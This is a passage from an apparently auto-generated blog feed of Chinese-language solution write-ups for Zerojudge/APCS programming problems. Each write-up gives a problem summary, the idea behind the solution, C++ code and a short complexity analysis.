<tbody><tr>
<td align="center">新編號</td>
<td align="center">-</td>
<td align="center">-</td>
<td align="center">0</td>
<td align="center">-</td>
<td align="center">1</td>
</tr>
</tbody></table>
<ul>
<li>第四輪<br>  $1$ 號被淘汰(上一輪編號)</li>
</ul>
<table>
<thead>
<tr>
<th align="center">上一輪編號</th>
<th align="center">-</th>
<th align="center">-</th>
<th align="center">0</th>
<th align="center">-</th>
<th align="center">1</th>
</tr>
</thead>
<tbody><tr>
<td align="center">新編號</td>
<td align="center">-</td>
<td align="center">-</td>
<td align="center">0</td>
<td align="center">-</td>
<td align="center">-</td>
</tr>
</tbody></table>
<p>觀察編號之間的關係，可以發現到因為循環的關係，<code>舊編號 = (新編號+m)%舊人數</code><br>因此，只要解決第 $k$ 輪的問題，第 $k-1$ 輪的答案也就出來了，再來遞迴求解即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,k;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> people, <span class="keyword">int</span> last)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(last==<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">int</span> res=m%people;</span><br><span class="line">		<span class="keyword">return</span> res;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(last==n)&#123;</span><br><span class="line">		<span class="keyword">int</span> res=(solve(people<span class="number">-1</span>, last<span class="number">-1</span>)+m+<span class="number">1</span>)%people;</span><br><span class="line">		<span class="keyword">return</span> res;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">int</span> res=(solve(people<span class="number">-1</span>, last<span class="number">-1</span>)+m)%people;</span><br><span class="line">		<span class="keyword">return</span> res;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m&gt;&gt;k;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;solve(n,k)+<span class="number">1</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>遞迴總共有 $k$ 層，每層的時間複雜度為 $O(1)$<br>總時間複雜度為 $O(k)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>recursive</tag>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge c295</title>
    <url>/2020/06/29/Zerojudge%20c295/</url>
    <content><![CDATA[<h1 id="Zerojudge-c295"><a href="#Zerojudge-c295" class="headerlink" title="Zerojudge c295"></a>Zerojudge c295</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=c295" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=c295</a><br>給 $N$ 群數字，每群數字包含 $M$ 個正整數，從每群數字中選最大的出來加總<br>輸出其總和 $S$ 以及各群數字中最大值能整除 $S$ 的數字</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>每群數字只需存最大值，接下來 $O(n)$ 判斷每個最大值是否能整除 $S$ 即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,s=<span class="number">0</span>,arr[<span class="number">25</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="keyword">int</span> Max=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>,tmp ; j&lt;m ; j++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;tmp;</span><br><span class="line">			Max=max(Max,tmp);</span><br><span class="line">		&#125;</span><br><span class="line">		arr[i]=Max;</span><br><span class="line">		s+=Max;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	<span class="keyword">bool</span> found = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(s%arr[i] == <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(found) <span class="built_in">cout</span>&lt;&lt;<span class="string">' '</span>;</span><br><span class="line">			<span class="keyword">else</span> found=<span class="literal">true</span>;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!found) <span class="built_in">cout</span>&lt;&lt;<span class="string">"-1"</span>;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>$O(n)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge c471</title>
    <url>/2020/06/28/Zerojudge%20c471/</url>
    <content><![CDATA[<h1 id="Zerojudge-c471"><a href="#Zerojudge-c471" class="headerlink" title="Zerojudge c471"></a>Zerojudge c471</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=c471" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=c471</a><br>給定 $n$ 個物品的重量 $w_i$ 與拿取次數 $f_i$<br>定義拿取物品 $i$ 的花費是其 $f_i$ 乘上在其上方物品的重量總和<br>求最小的花費總和</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>對於兩個物品 $i$ $j$，只要 $w_i \times f_j &lt; w_j \times f_i$ ，就將 $i$ 放在 $j$ 前面<br>所以我們只要將所有物品以這種方式排序就會得到最佳的擺放方式<br>最後再計算總花費即可求解</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> n,px[<span class="number">100005</span>],w[<span class="number">100005</span>],f[<span class="number">100005</span>],tot=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> w[i]*f[j] &lt; w[j]*f[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;w[i];</span><br><span class="line">		px[i]=i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;f[i];</span><br><span class="line">	&#125;</span><br><span class="line">	sort(px,px+n,cmp);</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		ans+=f[px[i]]*tot;</span><br><span class="line">		tot+=w[px[i]];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>排序時間複雜度為 $O(nlogn)$<br>計算花費時間複雜度為 $O(n)$<br>總時間複雜度為 $O(n+nlogn)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
        <tag>sort</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge c297</title>
    <url>/2020/06/29/Zerojudge%20c297/</url>
    <content><![CDATA[<h1 id="Zerojudge-c297"><a href="#Zerojudge-c297" class="headerlink" title="Zerojudge c297"></a>Zerojudge c297</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=c297" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=c297</a><br>給一場棒球各球員打擊的狀況，求在總出局為 $b$ 時，分數為多少</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>跟著模擬一遍壘包上的狀況即可<br>記得在出局數為3時要重新開始</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> stat[<span class="number">10</span>][<span class="number">10</span>];</span><br><span class="line"><span class="keyword">int</span> out=<span class="number">0</span>,out_tot=<span class="number">0</span>,point=<span class="number">0</span>,bat_time=<span class="number">0</span>,b;</span><br><span class="line"><span class="keyword">bool</span> base[<span class="number">4</span>];<span class="comment">//home, 1, 2, 3 base</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">(<span class="keyword">int</span> bases)</span></span>&#123;</span><br><span class="line">	base[<span class="number">0</span>]=<span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">while</span>(bases--)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span> ; i&gt;=<span class="number">0</span> ; i--)&#123;</span><br><span class="line">			<span class="keyword">if</span>(base[i])&#123;</span><br><span class="line">				base[i]=<span class="literal">false</span>;</span><br><span class="line">				<span class="keyword">if</span>(i==<span class="number">3</span>)</span><br><span class="line">					point++;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					base[i+<span class="number">1</span>]=<span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	base[<span class="number">0</span>]=<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,n ; i&lt;<span class="number">9</span> ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">		bat_time=max(bat_time,n);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;n ;  j++)</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;stat[i][j];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;b;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;bat_time ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">9</span> ; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(stat[j][i][<span class="number">1</span>] == <span class="string">'O'</span>)&#123;</span><br><span class="line">				out++;</span><br><span class="line">				out_tot++;</span><br><span class="line">				<span class="keyword">if</span>(out_tot == b)&#123;</span><br><span class="line">					<span class="built_in">cout</span>&lt;&lt;point&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">					<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span>(out == <span class="number">3</span>)&#123;</span><br><span class="line">					<span class="built_in">memset</span>(base,<span class="literal">false</span>,<span class="keyword">sizeof</span>(base));</span><br><span class="line">					out=<span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(stat[j][i][<span class="number">0</span>] == <span class="string">'1'</span>) run(<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(stat[j][i][<span class="number">0</span>] == <span class="string">'2'</span>) run(<span class="number">2</span>);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(stat[j][i][<span class="number">0</span>] == <span class="string">'3'</span>) run(<span class="number">3</span>);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(stat[j][i][<span class="number">0</span>] == <span class="string">'H'</span>) run(<span class="number">4</span>);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>有 $na$ 筆資料，每筆資料轉移時間複雜度為 $O(1)$<br>總複雜度 $O(na)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge c461</title>
    <url>/2020/06/28/Zerojudge%20c461/</url>
    <content><![CDATA[<h1 id="Zerojudge-c461"><a href="#Zerojudge-c461" class="headerlink" title="Zerojudge c461"></a>Zerojudge c461</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=c461" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=c461</a><br>給三個數值，問經過 <code>AND</code> <code>OR</code> <code>XOR</code> 之後的值是否與要求相同</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>直接照著題目做下去即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">bool</span> c;</span><br><span class="line"><span class="keyword">int</span> A,B;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;A&gt;&gt;B&gt;&gt;c)&#123;</span><br><span class="line">		<span class="keyword">bool</span> a=(A&gt;<span class="number">0</span>) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">bool</span> b=(B&gt;<span class="number">0</span>) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">bool</span> out=<span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">if</span>((a &amp;&amp; b) == c)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"AND\n"</span>;</span><br><span class="line">			out=<span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>((a || b) == c)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"OR\n"</span>;</span><br><span class="line">			out=<span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>((a ^ b) == c)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"XOR\n"</span>;</span><br><span class="line">			out=<span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(!out)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"IMPOSSIBLE\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>$O(1)$</p>
<h6 id="tags-Zerojudge"><a href="#tags-Zerojudge" class="headerlink" title="tags: Zerojudge"></a>tags: <code>Zerojudge</code></h6>]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge c575</title>
    <url>/2020/06/29/Zerojudge%20c575/</url>
    <content><![CDATA[<h1 id="Zerojudge-c575"><a href="#Zerojudge-c575" class="headerlink" title="Zerojudge c575"></a>Zerojudge c575</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=c575" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=c575</a><br>一個一維座標上有 $n$ 個點 $p$，在座標上最多放置 $k$ 個基地台<br>每個基地台可以隨意放在座標點上任一點(不限於整數座標)，若點包含於某基地台的半徑 $r$ 內則可接收到訊號<br>求基地台的最小直徑，使得所有標記的點都能接收到訊號</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>點可以說幾乎無限多個，顯然暴力去找基地台可以放在哪裡是不合理的<br>但是我們知道基地台可以隨便放，也知道需要包含在那些座標點上<br>我們可以先將所有座標點由小到大排序<br>很快可以知道基地台最大直徑為$p_n-p_1$，最小為1(一個點座標長度)<br>二分搜基地台的直徑 $R$ ，每次檢查 $R$ 是否符合</p>
<p>至於要如何檢查呢?<br>我們可以從 $p_1$ 開始，每次加上本次枚舉的直徑，將包含在直徑內的點都移除，並每次紀錄使用基地台數量<br>當基地台數量超過 $k$ 就不符合</p>
<h3 id="補充"><a href="#補充" class="headerlink" title="補充"></a>補充</h3><p>其實可以發現，基地台直徑最大為 $(p_n-p_1)/k$</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> n,k,base[<span class="number">50005</span>];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ok</span><span class="params">(<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> numbers=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,now=base[<span class="number">0</span>]+len ; i&lt;n &amp;&amp; numbers&lt;=k+<span class="number">1</span> ; )&#123;</span><br><span class="line">		now=base[i]+len;</span><br><span class="line">		numbers++;</span><br><span class="line">		<span class="keyword">while</span>(i&lt;n &amp;&amp; base[i]&lt;=now)</span><br><span class="line">			i++;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(numbers&lt;=k)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;k;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;base[i];</span><br><span class="line">	&#125;</span><br><span class="line">	sort(base,base+n);</span><br><span class="line">	<span class="keyword">int</span> low=<span class="number">1</span>,high=(base[n<span class="number">-1</span>]-base[<span class="number">0</span>])/k+<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span>(low&lt;high)&#123;</span><br><span class="line">		<span class="keyword">int</span> mid=(low+high)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span>(ok(mid))</span><br><span class="line">			high=mid;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			low=mid+<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;low&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>二分搜時間複雜度為 $O(log(high-low))$<br>本題 $high-low$ 最大不超過 $10^6$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Binary Search</tag>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge d713</title>
    <url>/2020/09/11/Zerojudge%20d713/</url>
    <content><![CDATA[<h1 id="Zerojudge-d713"><a href="#Zerojudge-d713" class="headerlink" title="Zerojudge d713"></a>Zerojudge d713</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=d713" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=d713</a><br>輸入多個數字，在輸入的同時輸出當前的序列中位數為多少(整數)</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>觀察中位數在序列中的性質<br>可以發現到，<strong>中位數必定會存在於序列的中間</strong><br>如果我們要動態找序列的中位數，可以利用這個性質</p>
<p>無論何時，我們關注的都是序列中的<strong>最中間兩個或是最中間一個數值</strong><br>只要我們知道這個數值，就可以輕鬆求得中位數</p>
<p>利用兩個priorty queue分別記錄<strong>小於當前中位數的序列</strong>以及<strong>剩餘元素</strong><br>且小於中位數的序列我們設定優先取得最大值，另一個優先取得最小值<br>那麼每次我們只要判斷當前元素要被放入哪個序列中，而中位數必定會在頂端</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line">priority_queue&lt;ll,<span class="built_in">vector</span>&lt;ll&gt;,greater&lt;ll&gt;&gt; Mh;</span><br><span class="line">priority_queue&lt;ll&gt; mh;</span><br><span class="line">ll n;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">		<span class="keyword">if</span>(mh.empty() || mh.top()&gt;n)&#123;</span><br><span class="line">			mh.emplace(n);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			Mh.emplace(n);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(mh.size() &gt; Mh.size()+<span class="number">1</span>)&#123;</span><br><span class="line">			Mh.emplace(mh.top());</span><br><span class="line">			mh.pop();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(Mh.size() &gt; mh.size()+<span class="number">1</span>)&#123;</span><br><span class="line">			mh.emplace(Mh.top());</span><br><span class="line">			Mh.pop();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(mh.size() == Mh.size())&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;(mh.top()+Mh.top())/<span class="number">2</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(mh.size() &gt; Mh.size())&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;mh.top()&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;Mh.top()&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>每次加入元素至多對priority queue做3次操作，複雜度為 $O(3nlogn)$</p>
<p>並且每次會做一次運算為$O(1)$</p>
<p>總複雜度約為$O(n^2logn)$</p>
